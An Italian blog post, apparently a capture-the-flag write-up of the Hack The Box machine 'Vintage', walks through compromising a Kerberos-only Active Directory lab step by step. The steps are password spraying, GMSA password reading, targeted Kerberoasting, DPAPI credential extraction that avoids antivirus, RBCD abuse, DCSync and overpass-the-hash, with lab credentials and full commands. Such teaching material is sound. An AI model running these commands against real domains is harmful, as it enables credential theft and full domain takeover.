+++
date = '2026-07-27T13:14:27+02:00'
draft = false
title = 'Vintage Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`31/07/2026`**

![Vintage.png](/images/imgs_vintage/Vintage.png)

---
# Introduzione

**_Vintage_** è un ambiente **Active Directory** livello **Hard**. È uno scenario **assumed breach** nel quale l'**autenticazione è basata esclusivamente su Kerberos**. Tratta complesse catene di permessi ed estrazione manuale di credenziali.

Partendo con un set di credenziali fornito inizialmente, l'exploitation path inizia bypassando la tradizionale **autenticazione NTLM** per enumerare il dominio via **Kerberos**. Concatenando un'errata configurazione della password di default su un account macchina **PRE-WINDOWS 2000 COMPATIBLE**, sono riuscito a leggere una **password GMSA**. Questo accesso mi ha permesso di manipolare le appartenenze ai gruppi, riabilitare un account di servizio e completare un **Targeted Kerberoasting** per ottenere l'accesso iniziale. 
Il lateral movement prevede l'estrazione manuale di un blob **DPAPI** per **bypassare l'antivirus** e recuperare delle **credenziali salvate**. Infine, la Privilege Escalation si basa sull'abuso dell'attributo **AllowedToAct** per estrarre gli hash di dominio tramite un **attacco DCSync** e impersonare un **amministratore** delegato, compromettendo definitivamente l'intero dominio.

---
# Tecniche Utilizzate

- **Autenticazione Kerberos & Password Spraying**

- **Estrazione Password GMSA**

- **Targeted Kerberoasting**

- **Pass-the-Hash**

- **Estrazione Manuale Credenziali DPAPI**

- **Resource-Based Constrained Delegation Attack**

- **Attacco DCSync**

- **Overpass-the-Hash**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- vintage -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49672/tcp open  unknown
49683/tcp open  unknown
54758/tcp open  unknown
54776/tcp open  unknown
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV vintage -Pn
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-25 15:14:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-25T15:14:43
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

Ho aggiunto **`vintage.htb`** e **`dc01.vintage.htb`** al mio file **`/etc/hosts`**.

## Enumerazione Active Directory

Ho iniziato la mia enumerazione utilizzando le credenziali inizialmente fornite: **P.Rosa:Rosaisbest123**.

Ho provato a enumerare le **SMB** share e gli utenti usando **NetExec**, con scarsi risultati:

```bash
nxc smb vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' --shares

nxc smb vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' --users
```

![smbfail.png](/images/imgs_vintage/smbfail.png)

L'output restituiva continuamente **`STATUS NOT SUPPORTED`**. Anche tentando con **WinRM** e passando la flag **`-k`** per l'autenticazione **Kerberos**, ottenevo solo errori.

Utilizzando l'indirizzo IP e usando la flag **`--rid-brute`**, sono finalmente riuscito a dumpare una lista valida di utenti:

```bash
nxc smb 10.129.231.205 -u P.Rosa -p Rosaisbest123 --rid-brute -k
```

![ridbrute.png](/images/imgs_vintage/ridbrute.png)

**Utenti Trovati**:

```text
Administrator
Guest
krbtgt
DC01$
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```

Ho quindi tentato un **password spray**:

```bash
nxc smb 10.129.231.205 -u users.txt -p Rosaisbest123 --continue-on-success -k
```

![ntlmdisable.png](/images/imgs_vintage/ntlmdisable.png)

Questo ha restituito un dettaglio molto importante: 
- **ogni utente riportava lo stesso errore `KDC_ERR_PREAUTH_FAILED`**.

Questo ha confermato il mio sospetto: l'autenticazione **NTLM** era disabilitata nel dominio. In questo ambiente era obbligatorio autenticarsi esclusivamente tramite **Kerberos**. Ciò spiegava perfettamente tutti gli errori iniziali incontrati.

---
# Accesso Iniziale | GMSA & Targeted Kerberoasting

Per avere un quadro più chiaro del dominio, ho raccolto dati con **BloodHound**:

```bash
bloodhound-python -u P.Rosa -p Rosaisbest123 -ns 10.129.231.205 -d vintage.htb -c all --zip
```

![harvest.png](/images/imgs_vintage/harvest.png)

Analizzando i dati, due utenti si differenziavano dagli altri: **`C.Neri`** e **`L.Bianchi`**. Facevano parte del gruppo **`ServiceManagers`**, che aveva privilegi **`GenericAll`** su tre account di servizio.

![hound1.png](/images/imgs_vintage/hound1.png)

La mia prima idea è stata quella di compromettere l'utente **`svc_sql`** per ottenerne il ticket, ma trovare il percorso d'attacco verso quell'utente non è stato poi così banale.

Dopo aver eseguito diverse **cypher query** personalizzate senza successo, ho spostato la mia attenzione sugli **Account Macchina**: **`FS01$`** e **`gMSA01$`**. 

Ho scoperto che **`FS01.VINTAGE.HTB`** era membro dei gruppi: **`Domain Computers`** e **`PRE-WINDOWS 2000 COMPATIBLE ACCESS`**.

![hound2.png](/images/imgs_vintage/hound2.png)

**Nota**: _Cercando informazioni sul gruppo **`PRE-WINDOWS 2000 COMPATIBLE ACCESS`**, ho scoperto che gli account presenti in questo gruppo vengono spesso configurati con una password di default che corrisponde esattamente al nome dell'account stesso._

![validate.png](/images/imgs_vintage/validate.png)

Ora, essendo **`FS01$`** membro del gruppo **`Domain Computers`**, possedeva il permesso **`ReadGMSAPassword`** sull'account **`GMSA01$`**.

![hound3.png](/images/imgs_vintage/hound3.png)

Inoltre, **`GMSA01$`** aveva permessi di **`AddSelf`** e **`GenericWrite`** sul gruppo **`ServiceManagers`**.

![hound4.jpeg](/images/imgs_vintage/hound4.jpeg)

A questo punto, il percorso d'attacco era chiaro.

Ho dumpato l'**hash GMSA**:

```bash
nxc ldap 10.129.231.205 -u 'fs01$' -p 'fs01' -k --gmsa
```

![gmsa.png](/images/imgs_vintage/gmsa.png)

e ho usato **bloodyAD** per aggiungere **`gmsa01$`** al gruppo **`ServiceManagers`**:

```bash
bloodyad --host dc01.vintage.htb -d vintage.htb -u 'gmsa01$' -p 'e082d85e0e0e5c2132e116c852cd1159' -f rc4 -k add groupMember ServiceManagers 'gmsa01$'
```

![gmsaadd.png](/images/imgs_vintage/gmsaadd.png)

Successivamente, ho richiesto un **TGT** per **`gmsa01$`** e ho tentato un **Targeted Kerberoasting**:

```bash
getTGT.py 'vintage.htb/gmsa01$' -dc-ip 10.129.231.205 -hashes :e082d85e0e0e5c2132e116c852cd1159

python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

![gmsaticket.png](/images/imgs_vintage/gmsaticket.png)

Qui ho notato qualcosa di strano: ho ricevuto i **TGS** per **`svc_ldap`** e **`svc_ark`**, ma non per **`svc_sql`**.
Ricontrollando **BloodHound**, ho notato che **`svc_sql`** presentava la flag **`ENABLED: FALSE`**. L'account era disabilitato.

Ho rimosso la flag **`ACCOUNTDISABLE`**:

```bash
bloodyad --host dc01.vintage.htb -d vintage.htb -u 'gmsa01$' -p 'e082d85e0e0e5c2132e116c852cd1159' -f rc4 -k remove uac svc_sql -f ACCOUNTDISABLE
```

![enablesql.png](/images/imgs_vintage/enablesql.png)

ho lanciato nuovamente il **Kerberoast** e ho catturato il **TGS** per **`svc_sql`**.

```
python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

![tgs.png](/images/imgs_vintage/tgs.png)

Ho salvato il ticket e l'ho craccato usando **John the Ripper**:

```bash
john svc_sql --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
```

![john](/images/imgs_vintage/john.png)

Come sono solito a fare quando scopro una nuova password in un ambiente AD, ho lanciato un **password spray**:

```bash
nxc smb 10.129.231.205 -u users.txt -p 'Zer0the0ne' --continue-on-success -k
```

![spray.png](/images/imgs_vintage/spray.png)

**Accesso valido per l'utente `C.Neri`**.

Secondo **BloodHound**, **`C.Neri`** era membro del **`Remote Management Group`**. Tuttavia, l'accesso standard tramite **WinRM** falliva.

![noaccess.png](/images/imgs_vintage/noaccess.png)

Mi stavo dimenticando la regola d'oro di questo dominio: Solo **Kerberos**.

Ho generato automaticamente un file **`krb5.conf`**:

```bash
nxc smb dc01.vintage.htb --generate-krb5-file vintage.krb5
```

![krb5config.png](/images/imgs_vintage/krb5config.png)

Ho richiesto un **TGT** per **`C.Neri`**, e l'ho usato con **Evil-WinRM** per ottenere una shell:

```bash
sudo cp vintage.krb5 /etc/krb5.conf
getTGT.py 'vintage.htb/c.neri' -dc-ip 10.129.47.169
export KRB5CCNAME=c.neri.ccache
evil-winrm -i dc01.vintage.htb -r vintage.htb
```

![userf.png](/images/imgs_vintage/userf.png)

Ho recuperato la **user flag** in **`C:\Users\C.Neri\Desktop\user.txt`**

---
# Lateral Movement | Decrittazione Manuale DPAPI

Nella mia personale metodologia, ogni volta che ottengo l'accesso a una macchina **Windows**, uno dei primi step di enumerazione che eseguo è controllare la presenza di **Stored Credentials** o **Vault**.

```powershell
cmdkey /list
```

![creds0.png](/images/imgs_vintage/creds0.png)

Se **cmdkey** non restituisce risultati procedo manualmente:

```
cd appdata\roaming\microsoft\credentials
gci -force
```

![creds1.png](/images/imgs_vintage/creds1.png)

Ho trovato un file di credenziali salvate chiamato **`C4BB96844A5C9DD45D5B6A9859252BA6`**. 

Ho provato più volte a scaricarlo sulla mia macchina **Kali** usando i comandi di download standard di **WinRM**, ma continuavo a riscontrare errori.

Ho tentato di usare **`Invoke-WCMDump.ps1`** per craccarlo dall'interno, ma lo script è stato istantaneamente rilevato e bloccato dall'**Antivirus** (**AV**).

![av.png](/images/imgs_vintage/av.png)

A questo punto, ho deciso di procedere con una tecnica manuale avanzata che ho imparato da **IppSec**: estrarre i raw bytes convertendoli in una stringa **Base64** direttamente da riga di comando, bypassando la necessità di scrivere file su disco o far scattare l'**AV** durante il download.

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\C4BB96844A5C9DD45D5B6A9859252BA6"))
```

![creds2.png](/images/imgs_vintage/creds2.png)

Ho poi estratto le **master key** dalla directory **`protect`**.

**Nota**: _Navigando nella directory, ho trovato due file diversi. Non essendo del tutto sicuro di quale fosse la **master key** corretta per questo specifico blob di credenziali (dato che la **DPAPI** può utilizzare chiavi diverse, come le chiavi **User/Machine** o le chiavi di **backup di dominio**), ho deciso di estrarle entrambe e lasciare che **pypykatz** gestisse offline il corretto mapping per la decrittazione._

```powershell
cd ../protect
cd S-1-5-21-4024337825-2033394866-2055507597-1115
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))
```

![creds3.png](/images/imgs_vintage/creds3.png)

![creds4.png](/images/imgs_vintage/creds4.png)

Tornato sulla mia macchina attaccante, ho decodificato le stringhe:

```bash
cat blob.654 | base64 -d > blob
cat key1.b64 | base64 -d > key1
cat key2.b64 | base64 -d > key2
```

![creds5.png](/images/imgs_vintage/creds5.png)

E ho usato **pypykatz** per decrittare le **master key** utilizzando la password dell'utente, sbloccando infine il blob di credenziali:

```bash
pypykatz prekey password 'S-1-5-21-4024337825-2033394866-2055507597-1115' 'Zer0the0ne' | tee pkf
pypykatz dpapi masterkey key1 pkf -o mkf1
pypykatz dpapi masterkey key2 pkf -o mkf2
pypykatz dpapi credential mkf2 blob
```

![creds6.png](/images/imgs_vintage/creds6.png)

---
# Privilege Escalation | AllowedToAct a Root

Ho controllato nuovamente **BloodHound** per mappare i permessi esatti del nuovo utente.

![kttk.png](/images/imgs_vintage/kttk.png)

Ho scoperto le **keys to the kingdom**: 
- **`c.neri_adm`** è membro del gruppo **`DelegatedAdmins`**, che ha il privilegio **`AllowedToAct`** sul **Domain Controller**.

Questo significava che il gruppo poteva configurare una **Resource-Based Constrained Delegation** (**RBCD**) e di fatto impersonare qualsiasi utente sul **DC**.

Ho aggiunto l'account macchina compromesso (**`fs01$`**) al gruppo **`DelegatedAdmins`** e ho richiesto un **ST** impersonando il **Domain Controller** stesso. Usando questo ticket, ho eseguito un attacco **DCSync** tramite **`secretsdump.py`** per estrarre gli hash di dominio direttamente dall'**NTDS**:

```bash
bloodyad --host dc01.vintage.htb -d vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember DelegatedAdmins 'fs01$'
```

![delegated.png](/images/imgs_vintage/delegated.png)

```bash
getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' -dc-ip 10.129.47.169 'vintage.htb/fs01$:fs01'
```

![st.png](/images/imgs_vintage/st.png)

```bash
KRB5CCNAME='dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache' secretsdump.py -k dc01.vintage.htb
```

![secrets.png](/images/imgs_vintage/secrets.png)

Dato che l'account **Administrator** non aveva l'accesso remoto abilitato, ho eseguito un attacco **Overpass-the-Hash**. Ho utilizzato l'hash di **`l.bianchi_adm`** per ottenere un **TGT** che ho passato ad una sessione **Evil-WinRM**:

```bash
getTGT.py -hashes :ec<REDACTED>19 vintage.htb/l.bianchi_adm@vintage.htb
```

![bianchi.png](/images/imgs_vintage/bianchi.png)

```bash
KRB5CCNAME='l.bianchi_adm@vintage.htb.ccache' evil-winrm -i dc01.vintage.htb -r vintage.htb
```

![rootf.png](/images/imgs_vintage/rootf.png)

Mi sono connesso come **Domain Admin** e ho recuperato la **root flag** in **`C:\Users\Administrator\Desktop\root.txt`**.

---
# Considerazioni Finali

**_Vintage_** è una masterclass assoluta sull'exploitation dei moderni ambienti **Active Directory** nonché una rappresentazione perfetta di uno scenario **assumed breach**.

A dire il vero, sebbene questa sia di gran lunga la macchina più difficile che io abbia mai pwnato, il percorso di exploitation in sé non prevede attacchi estremamente complicati. La vera difficoltà risiede nel trovare il percorso giusto e capire come muoversi all'interno del dominio con l'**autenticazione NTLM** completamente disabilitata. Ti costringe a non utilizzare le classiche metodologie per AD e richiede una solida comprensione del funzionamento di **Kerberos**.

Senza dubbio, la parte più bella della macchina è stata la fase di lateral movement. Estrarre manualmente il **blob DPAPI** e le **master key** da riga di comando per **bypassare l'Antivirus** è stato gratificante e fedele ad un'operazione di **Red Teaming**.

**Fonti**:

- **PRE-WINDOWS 2000 COMPATIBLE ACCESS | https://redheadsec.tech/compatibility-to-compromise/#:~:text=TLDR%3A%20Pre%2Dcreated%20Computer%20accounts%20have%20random%20passwords,back%20to%20this%20same%20default%20password%20format.**

- **Targeted Kerberoasting | https://github.com/ShutdownRepo/targetedKerberoast**

- **Invoke-WCMDump.ps1 | https://github.com/peewpw/Invoke-WCMDump**

- **Estrazione Manuale Windows DPAPI | https://ippsec.rocks/?#**

- **Attacco DCSync | https://www.youtube.com/watch?v=qEEB1SjPPQ8**